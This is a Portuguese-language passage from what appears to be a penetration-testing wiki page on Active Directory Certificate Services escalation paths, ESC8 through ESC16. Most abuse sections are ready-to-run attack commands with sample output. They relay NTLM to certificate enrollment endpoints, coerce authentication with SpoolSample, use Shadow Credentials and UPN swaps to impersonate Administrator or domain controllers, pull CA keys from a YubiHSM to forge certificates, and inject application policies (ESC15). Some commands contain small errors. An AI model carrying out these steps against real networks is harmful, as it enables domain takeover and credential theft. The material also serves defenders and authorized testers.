- O **Certificate Enrollment Service** (CES), o serviço web **Certificate Enrollment Policy** (CEP) e o **Network Device Enrollment Service** (NDES) oferecem suporte à autenticação negotiate por meio do cabeçalho HTTP Authorization. A autenticação negotiate **oferece suporte tanto** a Kerberos quanto a **NTLM**, permitindo que um atacante **rebaixe a autenticação para NTLM** durante ataques de relay. Embora esses serviços web habilitem HTTPS por padrão, apenas o HTTPS **não protege contra ataques NTLM Relay**. A proteção contra ataques NTLM Relay em serviços HTTPS só é possível quando o HTTPS é combinado com channel binding. Infelizmente, o AD CS não ativa o Extended Protection for Authentication no IIS, necessário para o channel binding.<sup>[[6]](#references)</sup>

Um **problema** comum dos ataques NTLM Relay é a **curta duração das sessões NTLM** e a incapacidade do atacante de interagir com serviços que **exigem assinatura NTLM**.

No entanto, essa limitação pode ser superada explorando um ataque NTLM Relay para obter um certificado para o usuário, já que o período de validade do certificado determina a duração da sessão, e o certificado pode ser usado com serviços que **exigem assinatura NTLM**. Para instruções sobre como usar um certificado roubado, consulte:


{{#ref}}
account-persistence.md
{{#endref}}

Outra limitação dos ataques NTLM Relay é que **uma conta da vítima precisa se autenticar em uma máquina controlada pelo atacante**. O atacante pode esperar ou tentar **forçar** essa autenticação:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuso**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumera **endpoints HTTP do AD CS habilitados**:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

A propriedade `msPKI-Enrollment-Servers` é usada pelas Autoridades de Certificação (CAs) corporativas para armazenar endpoints do Certificate Enrollment Service (CES). Esses endpoints podem ser analisados e listados usando a ferramenta **Certutil.exe**:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuso com Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Abuso com [Certipy](https://github.com/ly4k/Certipy)

Por padrão, o Certipy solicita um certificado com base no template `Machine` ou `User`, determinado conforme o nome da conta retransmitida termina ou não em `$`. É possível especificar um template alternativo usando o parâmetro `-template`.

Uma técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) pode então ser usada para coagir a autenticação. Ao lidar com controladores de domínio, é necessário especificar `-template DomainController`.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## Sem Extensão de Segurança - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explicação

O valor **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) de **`msPKI-Enrollment-Flag`**, denominado ESC9, omite a extensão SID `szOID_NTDS_CA_SECURITY_EXT` de um certificado. Exemplos antigos de ESC9 dependem do comportamento de compatibilidade do KDC (`StrongCertificateBindingEnforcement=1`) ou de uma rota separada de mapeamento fraco do Schannel. O valor `1` é uma **configuração histórica de compatibilidade**, não o padrão atual: a Microsoft informa que a substituição do KDC deixou de ser suportada com a atualização de segurança do Windows de 9 de setembro de 2025. Verifique a atualização real do alvo e o endpoint de autenticação antes de aplicar uma receita antiga.<sup>[[7]](#references)</sup> Consulte as [orientações de implantação da Microsoft](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

As condições em que a configuração desse sinalizador se torna relevante incluem:

- Em um KDC antigo compatível, a política efetiva de vinculação de certificados permite o mapeamento; alternativamente, o endpoint Schannel habilita separadamente o mapeamento UPN por meio do bit `0x4` de `CertificateMappingMethods`.
- O certificado está marcado com o sinalizador `CT_FLAG_NO_SECURITY_EXTENSION` na configuração de `msPKI-Enrollment-Flag`.
- O certificado especifica qualquer EKU de autenticação de cliente.
- Há permissões `GenericWrite` sobre qualquer conta para comprometer outra.

### Cenário de abuso

Suponha que `John@corp.local` tenha permissões `GenericWrite` sobre `Jane@corp.local`, com o objetivo de comprometer `Administrator@corp.local`. O modelo de certificado `ESC9`, no qual `Jane@corp.local` tem permissão para se inscrever, está configurado com o sinalizador `CT_FLAG_NO_SECURITY_EXTENSION` na configuração de `msPKI-Enrollment-Flag`.

Inicialmente, o hash de `Jane` é obtido usando Shadow Credentials, graças às permissões `GenericWrite` de `John`:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Posteriormente, o `userPrincipalName` de `Jane` é modificado para `Administrator`, omitindo propositalmente a parte do domínio @corp.local:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Esta modificação não viola as restrições, visto que `Administrator@corp.local` continua sendo distinto do `userPrincipalName` de `Administrator`.

Em seguida, o template de certificado `ESC9`, marcado como vulnerável, é solicitado como `Jane`:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

É observado que o `userPrincipalName` do certificado reflete `Administrator`, sem qualquer “object SID”.

Em seguida, o `userPrincipalName` de `Jane` é restaurado ao valor original, `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

A tentativa de autenticação com o certificado emitido agora retorna o hash NT de `Administrator@corp.local`. O comando deve incluir `-domain <domain>` devido à falta de especificação de domínio no certificado:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Mapeamentos fracos de certificados - ESC10

### Explicação

Duas políticas distintas de mapeamento de certificados costumam ser discutidas no contexto de ESC10. Verifique a configuração no endpoint que realmente lida com a autenticação relevante:

- `CertificateMappingMethods` do Schannel em `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` controla o mapeamento de certificados de cliente TLS no servidor de aplicação. O bit UPN é `0x4`; o valor padrão em sistemas atualizados é `0x18` (`0x8 | 0x10`).
- `StrongCertificateBindingEnforcement` do KDC em `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` historicamente controlava a compatibilidade do vínculo de certificados Kerberos. O valor `1` não é um padrão atual confiável, e a Microsoft encerrou o suporte a essa substituição com a atualização de segurança do Windows de 9 de setembro de 2025. Seu estado, por si só, não descreve o mapeamento UPN do Schannel.<sup>[[7]](#references)</sup>

**Caso 1**

Historicamente, quando um KDC antigo respeitava `StrongCertificateBindingEnforcement=0`; verifique o nível de atualização, pois essa substituição não é mais compatível em sistemas atuais com as correções instaladas.

**Caso 2**

Quando o endpoint de certificados de cliente do Schannel tem o bit UPN (`0x4`) de `CertificateMappingMethods` habilitado. Essa configuração é separada da imposição de vínculo forte do KDC e ainda exige um certificado de autenticação de cliente que possa ser inscrito, além de controle efetivo do atributo da conta mapeada.

### Caso de abuso 1

Em uma implantação antiga na qual o KDC ainda respeita `StrongCertificateBindingEnforcement=0`, o controle do `userPrincipalName` de uma conta pode fazer parte de um caminho de mapeamento fraco para outra conta. Os requisitos de inscrição do certificado, mapeamento, identidade de destino e autenticação bem-sucedida devem ser verificados separadamente; uma ACE `GenericWrite` ou um valor de registro, por si só, não comprova a tomada de controle.

Por exemplo, tendo permissões `GenericWrite` sobre `Jane@corp.local`, um atacante tem como objetivo comprometer `Administrator@corp.local`. O procedimento é semelhante ao do ESC9, permitindo o uso de qualquer template de certificado.

Inicialmente, o hash de `Jane` é obtido usando Shadow Credentials, explorando a permissão `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Em seguida, o `userPrincipalName` de `Jane` é alterado para `Administrator`, omitindo deliberadamente a parte `@corp.local` para evitar uma violação de restrição.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Em seguida, é solicitado como `Jane` um certificado que permite autenticação de cliente, usando o template padrão `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

O `userPrincipalName` de `Jane` é então revertido para o original, `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

A autenticação com o certificado obtido fornecerá o hash NT de `Administrator@corp.local`, sendo necessário especificar o domínio no comando, pois o certificado não contém informações sobre o domínio.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Caso de abuso 2

Com o bit flag `UPN` (`0x4`) presente em `CertificateMappingMethods`, uma conta A com permissões `GenericWrite` pode comprometer qualquer conta B que não tenha a propriedade `userPrincipalName`, incluindo contas de máquina e o administrador de domínio integrado `Administrator`.

Neste caso, o objetivo é comprometer `DC$@corp.local`, começando por obter o hash de `Jane` por meio de Shadow Credentials, aproveitando `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

O `userPrincipalName` de `Jane` é então definido como `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Um certificado para autenticação de cliente é solicitado como `Jane` usando o template padrão `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

O `userPrincipalName` de `Jane` é revertido ao valor original após esse processo.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Para autenticar via Schannel, utiliza-se a opção `-ldap-shell` do Certipy, indicando que a autenticação foi bem-sucedida como `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Por meio do shell LDAP, comandos como `set_rbcd` permitem ataques de Resource-Based Constrained Delegation (RBCD), podendo comprometer o controlador de domínio.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Esta vulnerabilidade também afeta qualquer conta de usuário sem `userPrincipalName` ou cujo valor não corresponda ao `sAMAccountName`. A conta padrão `Administrator@corp.local` é um alvo prioritário devido aos seus privilégios LDAP elevados e à ausência de `userPrincipalName` por padrão.

## Relaying NTLM to ICPR - ESC11

### Explicação

Se o servidor CA não estiver configurado com `IF_ENFORCEENCRYPTICERTREQUEST`, será possível realizar ataques de NTLM relay sem assinatura por meio do serviço RPC. [Referência](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Você pode usar `certipy` para verificar se `Enforce Encryption for Requests` está desativado; nesse caso, o certipy exibirá as vulnerabilidades `ESC11`.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Cenário de abuso

É necessário configurar um servidor de relay:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Nota: Para controladores de domínio, devemos especificar `-template` em DomainController.

Ou usando o fork do impacket de sploutchy:

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Shell access à CA do ADCS com YubiHSM - ESC12

### Explicação

Os administradores podem configurar a Autoridade de Certificação para armazenar as chaves em um dispositivo externo, como o "Yubico YubiHSM2".

Se um dispositivo USB estiver conectado ao servidor da CA por uma porta USB, ou a um servidor de dispositivos USB caso o servidor da CA seja uma máquina virtual, será necessária uma chave de autenticação (às vezes chamada de "senha") para que o Key Storage Provider gere e utilize chaves no YubiHSM.

Essa chave/senha fica armazenada em texto claro no registro, em `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

Referência [aqui](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Cenário de abuso

Se a chave privada da CA estiver armazenada em um dispositivo USB físico quando você obtiver acesso ao shell, será possível recuperá-la.

Primeiro, você precisa obter o certificado da CA (que é público) e, em seguida:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Por fim, use o comando `certutil -sign` para forjar um novo certificado arbitrário usando o certificado da CA e sua chave privada.

## Abuso de vínculo de grupo OID - ESC13

### Explicação

O atributo `msPKI-Certificate-Policy` permite adicionar a política de emissão ao modelo de certificado. Os objetos `msPKI-Enterprise-Oid`, responsáveis por emitir políticas, podem ser descobertos no Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) do contêiner PKI OID. Uma política pode ser vinculada a um grupo AD usando o atributo `msDS-OIDToGroupLink` desse objeto, permitindo que um sistema autorize um usuário que apresente o certificado como se fosse membro do grupo. [Referência aqui](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Em outras palavras, quando um usuário tem permissão para solicitar um certificado e o certificado está vinculado a um grupo OID, o usuário pode herdar os privilégios desse grupo.

Use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) para encontrar OIDToGroupLink:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Cenário de abuso

Encontre uma permissão de usuário que possa ser usada com `certipy find` ou `Certify.exe find /showAllPermissions`.

Se `John` tiver permissão para se inscrever em `VulnerableTemplate`, o usuário poderá herdar os privilégios do grupo `VulnerableGroup`.

Tudo o que precisa fazer é especificar o template; receberá um certificado com direitos `OIDToGroupLink`.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Abuso de Mapeamento Explícito de Certificados — ESC14

### Explicação

A descrição em https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping é extremamente detalhada. Abaixo está uma citação do texto original.<sup>[[14]](#references)</sup>

ESC14 aborda vulnerabilidades decorrentes de "mapeamento explícito fraco de certificados", principalmente pelo uso indevido ou pela configuração insegura do atributo `altSecurityIdentities` em contas de usuário ou computador do Active Directory. Esse atributo multivalorado permite que administradores associem manualmente certificados X.509 a uma conta do AD para fins de autenticação. Quando preenchidos, esses mapeamentos explícitos podem substituir a lógica padrão de mapeamento de certificados, que normalmente depende de UPNs ou nomes DNS no SAN do certificado, ou do SID incorporado na extensão de segurança `szOID_NTDS_CA_SECURITY_EXT`.

Um mapeamento "fraco" ocorre quando o valor de string usado no atributo `altSecurityIdentities` para identificar um certificado é muito abrangente, fácil de adivinhar, depende de campos de certificado não exclusivos ou usa componentes de certificado fáceis de falsificar. Se um atacante conseguir obter ou criar um certificado cujos atributos correspondam a esse mapeamento explícito fraco de uma conta privilegiada, poderá usar esse certificado para se autenticar como essa conta e se passar por ela.

Exemplos de strings de mapeamento potencialmente fracas em `altSecurityIdentities` incluem:

- Mapear apenas pelo Common Name (CN) comum do Subject: por exemplo, `X509:<S>CN=SomeUser`. Um atacante talvez consiga obter um certificado com esse CN de uma fonte menos segura.
- Usar Issuer Distinguished Names (DNs) ou Subject DNs excessivamente genéricos, sem qualificadores adicionais, como um número de série específico ou um identificador de chave do subject: por exemplo, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Usar outros padrões previsíveis ou identificadores não criptográficos que um atacante possa satisfazer em um certificado que consiga obter legitimamente ou falsificar (se tiver comprometido uma CA ou encontrado um template vulnerável, como no ESC1).

O atributo `altSecurityIdentities` aceita vários formatos de mapeamento, como:

- `X509:<I>IssuerDN<S>SubjectDN` (mapeia pelo DN completo do Issuer e do Subject)
- `X509:<SKI>SubjectKeyIdentifier` (mapeia pelo valor da extensão Subject Key Identifier do certificado)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapeia pelo número de série, qualificado implicitamente pelo DN do Issuer) - este não é um formato padrão; normalmente é `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapeia por um nome RFC822, geralmente um endereço de e-mail, do SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapeia pelo hash SHA1 da chave pública bruta do certificado - geralmente forte)

A segurança desses mapeamentos depende dos identificadores usados. A Microsoft classifica como **fracos** os mapeamentos baseados em e-mail ou nomes de subject, incluindo `X509:<RFC822>`. No modo Full Enforcement, um certificado sem um mapeamento forte é rejeitado; a atualização de segurança do Windows de setembro de 2025 removeu a opção de voltar ao modo Compatibility. Portanto, um mapeamento fraco, por si só, não é um caminho de impersonação confiável atualmente. Antes de avaliar um cenário de mapeamento fraco, verifique o nível de atualização real do controlador de domínio e o comportamento do mapeamento de certificados. O acesso de gravação a `altSecurityIdentities` é uma pista separada: um atacante com um certificado confiável apropriado pode conseguir adicionar um mapeamento explícito **forte**, sujeito às permissões efetivas e à validação do certificado. Consulte [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) e [the ESC14 research](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

Falhas na autenticação por certificado também precisam ser diagnosticadas: uma conta de destino desabilitada ou uma senha expirada pode impedir o login mesmo quando o certificado ainda é válido.

### Cenário de abuso

O ESC14 tem como alvo **mapeamentos explícitos de certificados** no Active Directory (AD), especificamente o atributo `altSecurityIdentities`. Se esse atributo estiver definido (por projeto ou por configuração incorreta), os atacantes poderão se passar por contas apresentando certificados que correspondam ao mapeamento.

#### Cenário A: O atacante pode gravar em `altSecurityIdentities`

 **Pré-condição**: O atacante tem permissões de gravação no atributo `altSecurityIdentities` da conta de destino ou tem permissão para concedê-las por meio de uma das seguintes permissões no objeto AD de destino:  
- Write property `altSecurityIdentities`  
- Write property `Public-Information`  
- Write property (all)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*.
#### Cenário B: O destino tem um mapeamento fraco por X509RFC822 (e-mail)

- **Pré-condição histórica/condicional**: O destino tem um mapeamento X509RFC822 fraco em `altSecurityIdentities`, o atacante pode editar o atributo `mail` de um solicitante e um template adequado inclui esse e-mail em um certificado de autenticação de cliente sem um vínculo de SID conflitante. A autenticação também exige um ambiente que ainda aceite o mapeamento fraco; o Full Enforcement rejeita mapeamentos de certificado que sejam apenas fracos. Um atributo `mail` gravável, por si só, é apenas uma pista.
#### Cenário C: O destino tem um mapeamento X509IssuerSubject

- **Pré-condição**: O destino tem um mapeamento explícito X509IssuerSubject fraco em `altSecurityIdentities`. O atacante pode definir o atributo `cn` ou `dNSHostName` em uma entidade principal vítima para corresponder ao subject do mapeamento X509IssuerSubject do destino. Em seguida, o atacante pode solicitar um certificado como a vítima e usar esse certificado para se autenticar como o destino.
#### Cenário D: O destino tem um mapeamento X509SubjectOnly

- **Pré-condição**: O destino tem um mapeamento explícito X509SubjectOnly fraco em `altSecurityIdentities`. O atacante pode definir o atributo `cn` ou `dNSHostName` em uma entidade principal vítima para corresponder ao subject do mapeamento X509SubjectOnly do destino. Em seguida, o atacante pode solicitar um certificado como a vítima e usar esse certificado para se autenticar como o destino.
### operações concretas
#### Cenário A

Solicite um certificado do template de certificado `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Salvar e converter o certificado

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Autenticar (usando o certificado)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Limpeza (opcional)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Para métodos de ataque mais específicos em vários cenários de ataque, consulte: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Políticas de Aplicação (CVE-2024-49019) - ESC15

### Explicação

A [pesquisa original sobre ESC15](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) explica como as políticas de aplicação fornecidas em uma solicitação para um template V1 podem substituir o Uso Estendido de Chave configurado em uma **CA emissora sem patch**.<sup>[[15]](#references)</sup> Também é necessário que haja um template publicado que permita inscrição e aceite as propriedades necessárias de assunto/solicitação, sem exigir aprovação ou assinatura que impeça a emissão. Ter apenas direitos de inscrição não comprova que a exploração seja possível. O uso do Certificate Request Agent também pode depender de um segundo template adequado e de restrições ao agente de inscrição; confirme o estado do patch da CA e o resultado da emissão antes de afirmar que esse caminho é viável.

### Exploração

A [documentação de escalonamento de privilégios do Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) contém exemplos de uso mais detalhados.<sup>[[14]](#references)</sup>


O comando `find` do Certipy pode ajudar a identificar templates V1 potencialmente vulneráveis a ESC15 se a CA não tiver o patch.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Cenário A: Impersonação direta via Schannel

**Etapa 1: Solicite um certificado, injetando a política de aplicação "Client Authentication" e a UPN do alvo.** O atacante `attacker@corp.local` tem como alvo `administrator@corp.local` usando o template V1 "WebServer" (que permite que o solicitante forneça o assunto).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: O template V1 vulnerável com "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Injeta o OID `1.3.6.1.5.5.7.3.2` na extensão Application Policies do CSR.
- `-upn 'administrator@corp.local'`: Define o UPN no SAN para impersonação.

**Etapa 2: Autentique via Schannel (LDAPS) usando o certificado obtido.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Cenário B: Impersonação via PKINIT/Kerberos por abuso de Enrollment Agent

**Etapa 1: Solicite um certificado de um template V1 (com "Enrollee supplies subject"), injetando a Application Policy "Certificate Request Agent".** Esse certificado é para o atacante (`attacker@corp.local`) se tornar um enrollment agent. Nenhum UPN é especificado para a identidade do próprio atacante aqui, pois o objetivo é obter a capacidade de agente.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: Injeta o OID `1.3.6.1.4.1.311.20.2.1`.

**Etapa 2: Use o certificado de "agent" para solicitar um certificado em nome de um usuário privilegiado alvo.** Esta etapa é semelhante a ESC3 e usa o certificado da Etapa 1 como certificado de agent.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Etapa 3: Autentique-se como o usuário privilegiado usando o certificado "on-behalf-of".**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Extensão de Segurança Desabilitada na CA (Globalmente)-ESC16

### Explicação

**ESC16 (Elevação de Privilégio por Ausência da Extensão szOID_NTDS_CA_SECURITY_EXT)** descreve a supressão, em toda a CA, da extensão SID **szOID_NTDS_CA_SECURITY_EXT**. Isso é um indicador de configuração, não uma prova de que um certificado pode autenticar como outra conta. A personificação também exige controle dos atributos ou do mapeamento da conta relevante, um template de autenticação de cliente que permita inscrição e um caminho de mapeamento de certificados aceito pelo controlador de domínio ou serviço real. Um KDC corrigido no modo Full Enforcement rejeita certificados sem uma extensão SID, a menos que tenham outro mapeamento forte; o procedimento Kerberos somente com UPN abaixo se aplica a KDCs mais antigos ou em modo de compatibilidade que ainda aceitam mapeamento fraco. Consulte as [orientações da Microsoft sobre mapeamento de certificados e aplicação](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Você também pode consultar este artigo para saber mais sobre o princípio em detalhes:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuso

O exemplo histórico de Kerberos somente com UPN a seguir baseia-se na [documentação de ESC16 do Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Ele exige um KDC que ainda aceite o mapeamento fraco resultante; `StrongCertificateBindingEnforcement=1` deixou de ser uma opção de substituição compatível após a atualização de segurança do Windows de 9 de setembro de 2025.<sup>[[14]](#references)</sup>

Para identificar se o ambiente do Active Directory Certificate Services (AD CS) está vulnerável a **ESC16**

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Etapa 1: Leia o UPN inicial da conta da vítima (Opcional - para restauração).  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Etapa 2: Atualize o UPN da conta vítima para o `sAMAccountName` do administrador-alvo.  **  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Etapa 3: (Se necessário) Obtenha credenciais para a conta "vítima" (por exemplo, via Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Etapa 4: Solicite um certificado como usuário "vítima" usando um template de autenticação de cliente no qual a conta possa se inscrever (por exemplo, "User") na CA configurada com ESC16.** A CA omite a extensão de segurança SID do certificado emitido, mas isso, por si só, não estabelece um mapeamento de autenticação utilizável. Defina a variável de ambiente do cache de credenciais Kerberos (comando de shell):

```bash
export KRB5CCNAME=victim.ccache
```

Em seguida, solicite o certificado:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Etapa 5: Restaure o UPN da conta da “vítima”.**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Etapa 6: Em um KDC mais antigo ou em modo de compatibilidade que aceita esse mapeamento fraco, autentique-se como o administrador de destino.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Substituição de identidade no callback de chase LDAP/LSA rogue (Certighost / CVE-2026-54121)

